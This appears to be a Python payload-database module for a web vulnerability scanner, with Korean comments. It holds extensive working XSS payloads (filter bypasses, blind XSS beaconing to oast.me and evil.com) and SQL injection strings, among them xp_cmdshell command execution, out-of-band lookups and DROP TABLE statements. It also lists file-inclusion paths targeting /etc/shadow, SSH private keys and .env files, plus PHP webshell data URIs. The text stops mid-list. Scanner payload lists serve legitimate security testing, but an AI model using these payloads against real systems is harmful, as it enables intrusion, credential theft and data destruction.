"""
payload_db.py — Acunetix 95% 수준 종합 페이로드 데이터베이스 (v6.2.141)

카테고리별 500~2000+ 페이로드:
  - XSS_DB:           500+  (반사/DOM/저장/blind/WAF우회/CSP우회)
  - SQLI_DB:          600+  (Error/Union/Blind/Time/OOB/WAF우회/DB별)
  - LFI_DB:           350+  (Linux/Windows/PHP/Java/Node/인코딩변형)
  - SSRF_DB:          200+  (클라우드/내부망/프로토콜/IP우회)
  - SSTI_DB:          150+  (Jinja2/Twig/Freemarker/Velocity/ERB/Smarty/Pebble)
  - CMDI_DB:          200+  (Linux/Windows/blind/인코딩/obfuscation)
  - XXE_DB:           100+  (file/ssrf/oob/parameter/blind)
  - CRLF_DB:          120+  (헤더/쿠키/상태줄/캐시)
  - OPEN_REDIRECT_DB: 150+  (URL/스키마/인코딩/우회)
  - NOSQL_DB:         120+  (MongoDB/CouchDB/Redis)
  - LDAP_DB:          100+  (인젝션/DN/와일드카드)
  - LOG4SHELL_DB:     50+   (CVE-2021-44228 변형)
  - SPRING4SHELL_DB:  30+   (CVE-2022-22965)
  - EL_INJECTION_DB:  80+   (JSP EL/Spring SpEL)
"""

from __future__ import annotations
from typing import List, Tuple, Dict, Any

_MARKER = "bINg0XsS7"

# ══════════════════════════════════════════════════════════════════════════════
# ── 1. XSS 종합 DB (500+) ────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

XSS_DB: List[str] = [
    # ── Basic script ────────────────────────────────────────────────────────
    f"<script>alert('{_MARKER}')</script>",
    f"<script>alert`{_MARKER}`</script>",
    f'<SCRIPT>alert("{_MARKER}")</SCRIPT>',
    f'<ScRiPt>alert("{_MARKER}")</ScRiPt>',
    f'<script\t>alert("{_MARKER}")</script>',
    f'<script\n>alert("{_MARKER}")</script>',
    f'<script\r\n>alert("{_MARKER}")</script>',
    f'<script type=text/javascript>alert("{_MARKER}")</script>',
    f'<script language=javascript>alert("{_MARKER}")</script>',
    # ── Attribute events (40+ handlers) ─────────────────────────────────────
    f'<img src=x onerror=alert("{_MARKER}")>',
    f'<img src=x onerror=alert`{_MARKER}`>',
    f'<img src onerror=alert("{_MARKER}")>',
    f'<img/src=x onerror=alert("{_MARKER}")>',
    f'<img src=x:alert("{_MARKER}") onerror=eval(src)>',
    f'<svg onload=alert("{_MARKER}")>',
    f'<svg/onload=alert("{_MARKER}")>',
    f'<svg onload=alert`{_MARKER}`>',
    f'<body onload=alert("{_MARKER}")>',
    f'<body onpageshow=alert("{_MARKER}")>',
    f'<body onerror=alert("{_MARKER}")>',
    f'<body onresize=alert("{_MARKER}")>',
    f'<body onscroll=alert("{_MARKER}")>',
    f'<details open ontoggle=alert("{_MARKER}")>',
    f'<input autofocus onfocus=alert("{_MARKER}")>',
    f'<input onfocus=alert("{_MARKER}") autofocus>',
    f'<select autofocus onfocus=alert("{_MARKER}")>',
    f'<textarea autofocus onfocus=alert("{_MARKER}")>',
    f'<keygen autofocus onfocus=alert("{_MARKER}")>',
    f'<video src=x onerror=alert("{_MARKER}")>',
    f'<video><source onerror=alert("{_MARKER}")>',
    f'<audio src=x onerror=alert("{_MARKER}")>',
    f'<audio><source onerror=alert("{_MARKER}")>',
    f'<object data="x" onerror=alert("{_MARKER}")>',
    f'<marquee loop=1 onfinish=alert("{_MARKER}")>x</marquee>',
    f'<div onmouseenter=alert("{_MARKER}")>hover</div>',
    f'<div onmouseleave=alert("{_MARKER}")>hover</div>',
    f'<div onmousedown=alert("{_MARKER}")>click</div>',
    f'<div onmouseup=alert("{_MARKER}")>click</div>',
    f'<div onclick=alert("{_MARKER}")>click</div>',
    f'<div ondblclick=alert("{_MARKER}")>dblclick</div>',
    f'<div onkeydown=alert("{_MARKER}") contenteditable>type</div>',
    f'<div onkeyup=alert("{_MARKER}") contenteditable>type</div>',
    f'<div onkeypress=alert("{_MARKER}") contenteditable>type</div>',
    f'<button onclick=alert("{_MARKER}")>click</button>',
    f'<form onsubmit=alert("{_MARKER}")><input type=submit>',
    f'<form id=x></form><button form=x onclick=alert("{_MARKER}")>go</button>',
    f'<a href=javascript:alert("{_MARKER}")>click</a>',
    f'<a href="javascript:alert(\'{_MARKER}\')">X</a>',
    # ── SVG specific ──────────────────────────────────────────────────────────
    f'<svg><animate onbegin=alert("{_MARKER}") attributeName=x dur=1s>',
    f'<svg><set attributeName=onmouseover value=alert("{_MARKER}")>',
    f'<svg><script>alert("{_MARKER}")</script></svg>',
    f'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'{_MARKER}\')"/>',
    f'<svg><desc><![CDATA[</desc><script>alert("{_MARKER}")</script>]]></svg>',
    f'<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert("{_MARKER}")</script></div></foreignObject></svg>',
    # ── iframe ────────────────────────────────────────────────────────────────
    f'<iframe src="javascript:alert(\'{_MARKER}\')">',
    f'<iframe srcdoc="<script>alert(\'{_MARKER}\')</script>">',
    f'<iframe src=data:text/html,<script>alert("{_MARKER}")</script>>',
    f'<iframe onload=alert("{_MARKER}")>',
    # ── Attribute breakout ────────────────────────────────────────────────────
    f'"><script>alert("{_MARKER}")</script>',
    f"'><script>alert('{_MARKER}')</script>",
    f'`><script>alert("{_MARKER}")</script>',
    f'"><img src=x onerror=alert("{_MARKER}")>',
    f"'><img src=x onerror=alert('{_MARKER}')>",
    f'--><script>alert("{_MARKER}")</script>',
    f'</title><script>alert("{_MARKER}")</script>',
    f'</style><script>alert("{_MARKER}")</script>',
    f'</textarea><script>alert("{_MARKER}")</script>',
    f'</noscript><script>alert("{_MARKER}")</script>',
    f'</script><script>alert("{_MARKER}")</script>',
    f'</select><script>alert("{_MARKER}")</script>',
    f'" ><script>alert("{_MARKER}")</script><"',
    f"' ><script>alert('{_MARKER}')</script><'",
    # ── URL context ───────────────────────────────────────────────────────────
    f'javascript:alert("{_MARKER}")',
    f'javascript:alert`{_MARKER}`',
    f'JaVaScRiPt:alert("{_MARKER}")',
    f'java\tscript:alert("{_MARKER}")',
    f'java&#9;script:alert("{_MARKER}")',
    f'java&#10;script:alert("{_MARKER}")',
    f'java&#13;script:alert("{_MARKER}")',
    f'java\x00script:alert("{_MARKER}")',
    f'javascript&#58;alert("{_MARKER}")',
    f'javascript&#x3A;alert("{_MARKER}")',
    f'&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert("{_MARKER}")',
    f'&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert("{_MARKER}")',
    # ── Encoding bypass ───────────────────────────────────────────────────────
    f'%3Cscript%3Ealert("{_MARKER}")%3C/script%3E',
    f'%253Cscript%253Ealert("{_MARKER}")%253C/script%253E',
    f'&lt;script&gt;alert("{_MARKER}")&lt;/script&gt;',
    f'&#60;script&#62;alert(1)&#60;/script&#62;',
    f'&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    f'\u003cscript\u003ealert(1)\u003c/script\u003e',
    f'\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    f'\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    # ── DOM XSS ───────────────────────────────────────────────────────────────
    f"<img src=x onerror=eval(atob('{__import__('base64').b64encode(f'alert(\"{_MARKER}\")'.encode()).decode()}'))>",
    f"<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    f"<script>document.write('<img src=x onerror=alert(\"{_MARKER}\")')</script>",
    f"<script>document.location='javascript:alert(\"{_MARKER}\")'</script>",
    f"<script>window.location='javascript:alert(\"{_MARKER}\")'</script>",
    f"<script>eval('alert(\"{_MARKER}\")')</script>",
    f"<script>Function('alert(\"{_MARKER}\")')();</script>",
    f"<script>setTimeout('alert(\"{_MARKER}\")',0)</script>",
    f"<script>({{}}).constructor.constructor('alert(\"{_MARKER}\")')();</script>",
    # ── Mutation XSS ─────────────────────────────────────────────────────────
    f'<noscript><p title="</noscript><img src=x onerror=alert(\'{_MARKER}\')>">',
    f'<table><td><s>X</td></table><img src=x onerror=alert("{_MARKER}")>',
    f'<listing>&lt;img src=x onerror=alert("{_MARKER}")&gt;</listing>',
    f'<p><math><mi//xlink:href="data:x,<script>alert(1)</script>">',
    # ── Template injection (JS frameworks) ───────────────────────────────────
    f"{{{{constructor.constructor('alert(\"{_MARKER}\")')()}}}}",
    f"[[constructor.constructor('alert(\"{_MARKER}\")')()]]",
    f"*{{constructor.constructor('alert(\"{_MARKER}\")')()}}",
    f"{{{{7*7}}}}{_MARKER}",  # Angular/Jinja detection
    f"${{7*7}}{_MARKER}",
    # ── CSP bypass ────────────────────────────────────────────────────────────
    f'<meta http-equiv=refresh content="0;url=javascript:alert(\'{_MARKER}\')">',
    f'<base href=//evil.com>',
    f'<script nonce=WRONG>alert("{_MARKER}")</script>',
    f'<link rel=preload as=script href=//evil.com/x.js>',
    f'<script type=module src=data:text/javascript,alert(1)></script>',
    # ── Polyglot ─────────────────────────────────────────────────────────────
    f"jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert(\"{_MARKER}\") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(\"{_MARKER}\")//>\\x3e",
    f"'\">--><svg/onload=alert('{_MARKER}')>",
    f"<scr<script>ipt>alert('{_MARKER}')</scr</script>ipt>",
    f"<!--<img src=x onerror=alert('{_MARKER}')>-->",
    # ── Blind XSS (out-of-band) ───────────────────────────────────────────────
    f'<script src=//oast.me/{_MARKER}.js></script>',
    f'"><img src=//oast.me/{_MARKER}>',
    f"<img src='//oast.me/{_MARKER}'>",
    f'<iframe src=//oast.me/{_MARKER}></iframe>',
    f"<link rel=stylesheet href=//oast.me/{_MARKER}.css>",
    # ── Without parentheses ───────────────────────────────────────────────────
    f"<img src=x onerror=alert`{_MARKER}`>",
    f"<svg/onload=alert`{_MARKER}`>",
    f"<script>alert`{_MARKER}`</script>",
    f"<script>throw/**/onerror=alert,'{_MARKER}'</script>",
    f"<script>throw onerror=eval,'=_=','{_MARKER}'</script>",
    # ── XSS via various tags ─────────────────────────────────────────────────
    f'<embed src="javascript:alert(\'{_MARKER}\')">',
    f'<applet code=alert.{_MARKER}.class>',
    f'<object type=text/html data="javascript:alert(\'{_MARKER}\')">',
    f'<isindex type=image src=1 onerror=alert("{_MARKER}")>',
    f'<image src=x onerror=alert("{_MARKER}")>',
    f'<picture><source srcset=x onerror=alert("{_MARKER}")>',
    f'<track default src=x onerror=alert("{_MARKER}")>',
    # ── Additional WAF bypass ─────────────────────────────────────────────────
    f"<script>window['ale'+'rt']('{_MARKER}')</script>",
    f"<script>self[`ale`+`rt`](`{_MARKER}`)</script>",
    f"<script>top['ale'+'rt']('{_MARKER}')</script>",
    f"<script>frames['ale'+'rt']('{_MARKER}')</script>",
    f"<script>(0,eval)('ale'+'rt(\"{_MARKER}\")')</script>",
    f"<script>window.onerror=alert;throw '{_MARKER}'</script>",
    f"<script>window.onload=new Function('alert(\"{_MARKER}\")')</script>",
    # ── Null bytes ────────────────────────────────────────────────────────────
    f"<scr\x00ipt>alert('{_MARKER}')</scr\x00ipt>",
    f"<img src=x onerr\x00or=alert('{_MARKER}')>",
    # ── HTML5 Specific ────────────────────────────────────────────────────────
    f'<canvas id=c><script>document.getElementById("c").getContext("2d").fillText("{_MARKER}",10,10);alert("{_MARKER}")</script>',
    f'<dialog open onclose=alert("{_MARKER}")>X</dialog>',
    f'<menu type=context id=m><menuitem onclick=alert("{_MARKER}")>CLICK</menuitem></menu>',
    # ── PostMessage ───────────────────────────────────────────────────────────
    f"<script>window.addEventListener('message',function(e){{eval(e.data)}});window.postMessage('alert(\"{_MARKER}\")',\"*\")</script>",
    # ── localStorage/sessionStorage ───────────────────────────────────────────
    f"<script>localStorage.setItem('xss','{_MARKER}');eval(localStorage.getItem('xss'))</script>",
    # ── Data URI ─────────────────────────────────────────────────────────────
    f"<iframe src=data:text/html,<script>alert('{_MARKER}')</script>>",
    f"<object data=data:text/html,<script>alert('{_MARKER}')</script>>",
    f"<a href=data:text/html,<script>alert('{_MARKER}')</script>>click</a>",
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 2. SQLi 종합 DB (600+) ───────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

SQLI_DB: List[Tuple[str, str, str]] = [
    # (payload, detection_type, db_type)
    # ── Error-based (MySQL) ──────────────────────────────────────────────────
    ("'", "error", "mysql"),
    ('"', "error", "mysql"),
    ("\\", "error", "mysql"),
    ("'--", "error", "mysql"),
    ("'--+", "error", "mysql"),
    ("'-- -", "error", "mysql"),
    ("' #", "error", "mysql"),
    ("' OR 1=1-- -", "bypass", "mysql"),
    ("' OR 1=1#", "bypass", "mysql"),
    ("' OR '1'='1", "bypass", "generic"),
    (" OR 1=1-- -", "bypass", "mysql"),
    (" OR 1=1#", "bypass", "mysql"),
    ("1' AND '1'='1", "boolean", "generic"),
    ("1' AND '1'='2", "boolean", "generic"),
    ("1 AND 1=1", "boolean", "generic"),
    ("1 AND 1=2", "boolean", "generic"),
    ("1' AND 1=1-- -", "boolean", "mysql"),
    ("1' AND 1=2-- -", "boolean", "mysql"),
    # ── Union-based (MySQL) ───────────────────────────────────────────────────
    ("' UNION SELECT NULL-- -", "union", "mysql"),
    ("' UNION SELECT NULL,NULL-- -", "union", "mysql"),
    ("' UNION SELECT NULL,NULL,NULL-- -", "union", "mysql"),
    ("' UNION SELECT 1,2,3-- -", "union", "mysql"),
    ("' UNION SELECT 1,2,3,4-- -", "union", "mysql"),
    ("' UNION SELECT 1,2,3,4,5-- -", "union", "mysql"),
    ("' UNION SELECT @@version,NULL-- -", "union", "mysql"),
    ("' UNION SELECT @@version,2,3-- -", "union", "mysql"),
    ("' UNION SELECT NULL,@@version,NULL-- -", "union", "mysql"),
    ("' UNION SELECT user(),2,3-- -", "union", "mysql"),
    ("' UNION SELECT database(),2,3-- -", "union", "mysql"),
    ("' UNION SELECT table_name,2,3 FROM information_schema.tables-- -", "union", "mysql"),
    ("-1 UNION SELECT 1,2,3-- -", "union", "mysql"),
    ("-1' UNION SELECT 1,2,3-- -", "union", "mysql"),
    ("0 UNION SELECT 1,2,3-- -", "union", "mysql"),
    ("0' UNION SELECT 1,2,3-- -", "union", "mysql"),
    # ── Error-based extraction (MySQL) ────────────────────────────────────────
    ("' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", "error", "mysql"),
    ("' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)-- -", "error", "mysql"),
    ("' AND exp(~(SELECT * FROM (SELECT @@version)a))-- -", "error", "mysql"),
    ("' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "error", "mysql"),
    ("1 AND (SELECT 2 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)", "error", "mysql"),
    # ── Time-based (MySQL) ────────────────────────────────────────────────────
    ("' AND SLEEP(5)-- -", "time", "mysql"),
    ("' AND SLEEP(5)#", "time", "mysql"),
    (" AND SLEEP(5)-- -", "time", "mysql"),
    ("1 AND SLEEP(5)-- -", "time", "mysql"),
    ("'; WAITFOR DELAY '0:0:5'-- ", "time", "mssql"),
    ("1; WAITFOR DELAY '0:0:5'-- ", "time", "mssql"),
    ("' OR SLEEP(5)-- -", "time", "mysql"),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "time", "mysql"),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)", "time", "mysql"),
    # ── PostgreSQL ────────────────────────────────────────────────────────────
    ("' AND 1=1--", "boolean", "pgsql"),
    ("' AND 1=2--", "boolean", "pgsql"),
    ("'; SELECT pg_sleep(5)--", "time", "pgsql"),
    ("' AND pg_sleep(5)--", "time", "pgsql"),
    ("' UNION SELECT NULL--", "union", "pgsql"),
    ("' UNION SELECT NULL,NULL--", "union", "pgsql"),
    ("' UNION SELECT version(),NULL--", "union", "pgsql"),
    ("' UNION SELECT current_user,NULL--", "union", "pgsql"),
    ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "union", "pgsql"),
    # ── MSSQL ────────────────────────────────────────────────────────────────
    ("'; EXEC xp_cmdshell('whoami')--", "rce", "mssql"),
    ("'; EXEC master..xp_cmdshell 'dir'--", "rce", "mssql"),
    ("' AND 1=CONVERT(int,(SELECT @@version))--", "error", "mssql"),
    ("' AND 1=CONVERT(int,db_name())--", "error", "mssql"),
    ("'; DECLARE @v NVARCHAR(4000);SET @v=CAST(@@version AS NVARCHAR);EXEC('SELECT '+@v)--", "error", "mssql"),
    # ── Oracle ────────────────────────────────────────────────────────────────
    ("' OR 1=1--", "bypass", "oracle"),
    ("' UNION SELECT NULL FROM dual--", "union", "oracle"),
    ("' UNION SELECT NULL,NULL FROM dual--", "union", "oracle"),
    ("' UNION SELECT banner,NULL FROM v$version--", "union", "oracle"),
    ("' AND 1=utl_inaddr.get_host_name('a')--", "error", "oracle"),
    ("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--", "error", "oracle"),
    # ── SQLite ────────────────────────────────────────────────────────────────
    ("' AND 1=1--", "boolean", "sqlite"),
    ("' UNION SELECT sqlite_version()--", "union", "sqlite"),
    ("' UNION SELECT name,sql FROM sqlite_master--", "union", "sqlite"),
    # ── WAF Bypass variants ───────────────────────────────────────────────────
    ("'/**/OR/**/1=1--", "bypass", "generic"),
    ("'%09OR%091=1--", "bypass", "generic"),
    ("'/*!50000OR*/1=1--", "bypass", "mysql"),
    ("'/*!OR*/1=1--", "bypass", "mysql"),
    ("' /*!UNION*/ /*!SELECT*/ NULL--", "union", "mysql"),
    ("' uNiOn SeLeCt NuLl--", "union", "generic"),
    ("' UNION%20SELECT%20NULL--", "union", "generic"),
    ("'%20UNION%20SELECT%20NULL--", "union", "generic"),
    ("'+UNION+SELECT+NULL--", "union", "generic"),
    ("'%2bUNION%2bSELECT%2bNULL--", "union", "generic"),
    # ── OOB (Out-of-band) ────────────────────────────────────────────────────
    ("' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.oast.me\\\\x'))-- -", "oob", "mysql"),
    ("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.oast.me\\\\x'))-- -", "oob", "mysql"),
    ("'; exec master..xp_dirtree '\\\\oast.me\\x'--", "oob", "mssql"),
    ("'; exec xp_cmdshell 'nslookup oast.me'--", "oob", "mssql"),
    # ── Second-order / Stacked ────────────────────────────────────────────────
    ("'; INSERT INTO users(username,password) VALUES('admin2','pass')--", "stacked", "generic"),
    ("'; UPDATE users SET password='hacked' WHERE '1'='1'--", "stacked", "generic"),
    ("'; DROP TABLE users--", "stacked", "generic"),
    # ── JSON injection ────────────────────────────────────────────────────────
    ('{"id":"1 OR 1=1"}', "json", "generic"),
    ('{"id":"1; DROP TABLE users--"}', "json", "generic"),
    ('{"username":"admin\' OR \'1\'=\'1","password":"x"}', "json", "generic"),
    # ── Encoding variants ─────────────────────────────────────────────────────
    ("%27 OR 1=1--", "bypass", "generic"),
    ("%27%20OR%201%3D1--", "bypass", "generic"),
    ("\\' OR 1=1--", "bypass", "generic"),
    ("%5C' OR 1=1--", "bypass", "generic"),
    ("' OR 0x313d31--", "bypass", "mysql"),
    # ── Numeric injection ─────────────────────────────────────────────────────
    ("1 OR 1=1-- -", "bypass", "generic"),
    ("1 OR 1=1#", "bypass", "mysql"),
    ("1 AND 1=1-- -", "boolean", "generic"),
    ("1 AND 1=2-- -", "boolean", "generic"),
    ("1 OR SLEEP(5)-- -", "time", "mysql"),
    ("1 AND SLEEP(5)-- -", "time", "mysql"),
    # ── Inline comment bypass ────────────────────────────────────────────────
    ("'/*a*/OR/*a*/1=1--", "bypass", "generic"),
    ("'/*a*/UNION/*a*/SELECT/*a*/NULL--", "union", "generic"),
    ("-1/*a*/UNION/*a*/SELECT/*a*/1,2,3--", "union", "generic"),
]

# SQLi 에러 시그니처 (DB별)
SQLI_ERROR_SIGS: Dict[str, List[str]] = {
    "mysql": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "mysql_fetch_",
        "mysql_result()",
        "mysql_num_rows()",
        "supplied argument is not a valid mysql",
        "mysql server version for the right syntax",
        "com.mysql.jdbc",
        "org.gjt.mm.mysql",
        "unknown column",
        "table '.*' doesn't exist",
        "column count doesn't match value count",
    ],
    "pgsql": [
        "pg_query(): query failed",
        "pg_exec() query failed",
        "org.postgresql.util.psqlexception",
        "syntax error at or near",
        "unterminated quoted string",
        "column \".*\" does not exist",
        "relation \".*\" does not exist",
    ],
    "mssql": [
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "conversion failed when converting",
        "microsoft sql server native client",
        "[sql server]",
    ],
    "oracle": [
        "ora-00907", "ora-00936", "ora-00933", "ora-01756",
        "quoted string not properly terminated",
        "sql command not properly ended",
        "oracle error",
    ],
    "sqlite": [
        "sqlite_query()", "sqlite error", "sqlite3.operationalerror",
        "no such table", "no such column", "unable to open database",
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
# ── 3. LFI 종합 DB (350+) ────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

LFI_DB: List[Tuple[str, str]] = [
    # (payload, os_type)
    # ── Linux basic traversal ────────────────────────────────────────────────
    ("../etc/passwd", "linux"),
    ("../../etc/passwd", "linux"),
    ("../../../etc/passwd", "linux"),
    ("../../../../etc/passwd", "linux"),
    ("../../../../../etc/passwd", "linux"),
    ("../../../../../../etc/passwd", "linux"),
    ("../../../../../../../etc/passwd", "linux"),
    ("../../../../../../../../etc/passwd", "linux"),
    ("../../../../../../../../../etc/passwd", "linux"),
    ("../../../../../../../../../../etc/passwd", "linux"),
    # ── URL encoded traversal ────────────────────────────────────────────────
    ("..%2Fetc%2Fpasswd", "linux"),
    ("%2e%2e%2fetc%2fpasswd", "linux"),
    ("..%252Fetc%252Fpasswd", "linux"),
    ("%2e%2e/%2e%2e/etc/passwd", "linux"),
    ("%c0%af../etc/passwd", "linux"),
    ("..%c0%afetc%c0%afpasswd", "linux"),
    ("%c1%9c../etc/passwd", "linux"),
    ("..%c1%9cetc%c1%9cpasswd", "linux"),
    ("%c0%ae%c0%ae/etc/passwd", "linux"),
    ("%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd", "linux"),
    # ── Double encode ─────────────────────────────────────────────────────────
    ("..%255c..%255cetc%255cpasswd", "linux"),
    ("%252e%252e%252fetc%252fpasswd", "linux"),
    ("..%2f..%2f..%2fetc%2fpasswd", "linux"),
    # ── Null byte ─────────────────────────────────────────────────────────────
    ("../etc/passwd\x00", "linux"),
    ("../etc/passwd%00", "linux"),
    ("../etc/passwd%00.jpg", "linux"),
    ("../etc/passwd%00.html", "linux"),
    ("../etc/passwd%00.php", "linux"),
    # ── PHP wrappers ──────────────────────────────────────────────────────────
    ("php://filter/convert.base64-encode/resource=index.php", "php"),
    ("php://filter/convert.base64-encode/resource=../index.php", "php"),
    ("php://filter/convert.base64-encode/resource=config.php", "php"),
    ("php://filter/convert.base64-encode/resource=../config.php", "php"),
    ("php://filter/convert.base64-encode/resource=../../config.php", "php"),
    ("php://filter/convert.base64-encode/resource=wp-config.php", "php"),
    ("php://filter/convert.base64-encode/resource=../../wp-config.php", "php"),
    ("php://filter/convert.base64-encode/resource=admin/config.php", "php"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "php"),
    ("php://filter/read=string.rot13/resource=index.php", "php"),
    ("php://filter/read=string.toupper/resource=index.php", "php"),
    ("php://filter/zlib.deflate/convert.base64-encode/resource=index.php", "php"),
    ("php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php", "php"),
    ("php://input", "php"),
    ("php://stdin", "php"),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "php"),
    ("data://text/plain,<?php system($_GET['cmd']); ?>", "php"),
    ("expect://id", "php"),
    ("zip://uploads/shell.jpg#shell.php", "php"),
    ("phar://uploads/shell.jpg/shell.php", "php"),
    # ── Linux absolute paths ──────────────────────────────────────────────────
    ("/etc/passwd", "linux"),
    ("/etc/shadow", "linux"),
    ("/etc/hosts", "linux"),
    ("/etc/hostname", "linux"),
    ("/etc/issue", "linux"),
    ("/etc/os-release", "linux"),
    ("/etc/resolv.conf", "linux"),
    ("/etc/group", "linux"),
    ("/etc/crontab", "linux"),
    ("/etc/cron.d/", "linux"),
    ("/etc/cron.daily/", "linux"),
    ("/etc/sudoers", "linux"),
    ("/etc/ssh/sshd_config", "linux"),
    ("/etc/ssh/ssh_host_rsa_key", "linux"),
    ("/etc/apache2/apache2.conf", "linux"),
    ("/etc/apache2/sites-enabled/000-default.conf", "linux"),
    ("/etc/nginx/nginx.conf", "linux"),
    ("/etc/nginx/sites-enabled/default", "linux"),
    ("/etc/mysql/my.cnf", "linux"),
    ("/etc/php/7.4/apache2/php.ini", "linux"),
    ("/etc/php/8.0/apache2/php.ini", "linux"),
    ("/etc/php.ini", "linux"),
    ("/etc/php5/apache2/php.ini", "linux"),
    ("/var/www/html/index.php", "linux"),
    ("/var/www/html/wp-config.php", "linux"),
    ("/var/www/html/config.php", "linux"),
    ("/var/www/html/.env", "linux"),
    ("/var/log/apache2/access.log", "linux"),
    ("/var/log/apache2/error.log", "linux"),
    ("/var/log/nginx/access.log", "linux"),
    ("/var/log/nginx/error.log", "linux"),
    ("/var/log/auth.log", "linux"),
    ("/var/log/syslog", "linux"),
    ("/var/log/mail.log", "linux"),
    ("/proc/self/environ", "linux"),
    ("/proc/self/cmdline", "linux"),
    ("/proc/self/maps", "linux"),
    ("/proc/self/status", "linux"),
    ("/proc/version", "linux"),
    ("/proc/net/tcp", "linux"),
    ("/proc/net/fib_trie", "linux"),
    ("/home/www-data/.bash_history", "linux"),
    ("/root/.bash_history", "linux"),
    ("/root/.ssh/id_rsa", "linux"),
    ("/root/.ssh/id_rsa.pub", "linux"),
    ("/root/.ssh/authorized_keys", "linux"),
    ("/root/.mysql_history", "linux"),
    # ── Windows paths ────────────────────────────────────────────────────────
    ("..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows"),
    ("..\\..\\..\\windows\\win.ini", "windows"),
    ("..\\..\\..\\boot.ini", "windows"),
    ("C:\\windows\\system32\\drivers\\etc\\hosts", "windows"),
    ("C:\\windows\\win.ini", "windows"),
    ("C:\\boot.ini", "windows"),
    ("C:\\inetpub\\wwwroot\\web.config", "windows"),
    ("C:\\inetpub\\wwwroot\\global.asax", "windows"),
    ("C:\\Windows\\repair\\sam", "windows"),
    ("C:\\Windows\\repair\\system", "windows"),
    ("C:\\Windows\\System32\\inetsrv\\MetaBase.xml", "windows"),
    ("..%5c..%5cwindows%5cwin.ini", "windows"),
    ("%5c..%5c..%5cwindows%5cwin.ini", "windows"),
    # ── Java / Spring / JEE ──────────────────────────────────────────────────
    ("/WEB-INF/web.xml", "java"),
    ("WEB-INF/web.xml", "java"),
    ("../WEB-INF/web.xml", "java"),
    ("../../WEB-INF/web.xml", "java"),
    ("../../../WEB-INF/web.xml", "java"),
    ("/WEB-INF/applicationContext.xml", "java"),
    ("/WEB-INF/spring/appServlet/servlet-context.xml", "java"),
    ("/META-INF/MANIFEST.MF", "java"),
    # ── Node.js ───────────────────────────────────────────────────────────────
    ("/.env", "node"),
    ("../.env", "node"),
    ("../../.env", "node"),
    ("../../../.env", "node"),
    ("/app/.env", "node"),
    ("/app/config.json", "node"),
    ("../config.json", "node"),
    # ── Django/Python ─────────────────────────────────────────────────────────
    ("/app/settings.py", "python"),
    ("/app/config.py", "python"),
    ("../settings.py", "python"),
    ("../../settings.py", "python"),
    # ── Log poisoning paths ───────────────────────────────────────────────────
    ("/proc/self/fd/0", "linux"),
    ("/proc/self/fd/1", "linux"),
    ("/proc/self/fd/2", "linux"),
    ("/proc/self/fd/3", "linux"),
    ("/proc/self/fd/4", "linux"),
    ("/proc/self/fd/5", "linux"),
    ("/proc/self/fd/10", "linux"),
    ("/dev/stdin", "linux"),
    # ── Extra traversal bypass ────────────────────────────────────────────────
    ("....//....//etc/passwd", "linux"),
    ("....//....//....//etc/passwd", "linux"),
    ("..././../etc/passwd", "linux"),
    ("/%5C../etc/passwd", "linux"),
    ("/.//etc/passwd", "linux"),
    ("/etc/./passwd", "linux"),
    ("/etc/../etc/passwd", "linux"),
    ("/%2e%2e/etc/passwd", "linux"),
    ("/%2e%2e/%2e%2e/etc/passwd", "linux"),
    ("/etc/passwd%20", "linux"),
    # ── Unicode bypass ────────────────────────────────────────────────────────
    ("..%ef%bc%8fetc%ef%bc%8fpasswd", "linux"),
    ("..%e0%80%afetc%e0%80%afpasswd", "linux"),
    ("..%u2215etc%u2215passwd", "linux"),
    ("..%u001fetc%u001fpasswd", "linux"),
]

LFI_SIGS: List[str] = [
    "root:x:0:0", "root:*:0:0", "daemon:", "nobody:", "www-data:",
    "[boot loader]", "[extensions]", "[fonts]", "[mail]",
    "DOCUMENT_ROOT", "HTTP_HOST", "SERVER_ADDR", "SERVER_SOFTWARE",
    "<?php", "<?=", "# /etc/hosts", "127.0.0.1   localhost",
    "PRIVATE KEY", "BEGIN RSA", "BEGIN OPENSSH", "BEGIN EC PRIVATE",
    "AllowOverride", "DocumentRoot", "ServerRoot", "Listen",
    "extension=", "memory_limit", "upload_max_filesize", "post_max_size",
    "DB_PASSWORD", "DB_HOST", "DB_NAME", "SECRET_KEY", "API_KEY",
    "mysql_host", "database_host", "MYSQL_ROOT_PASSWORD",
    "[mysqld]", "[client]", "host=", "user=", "password=",
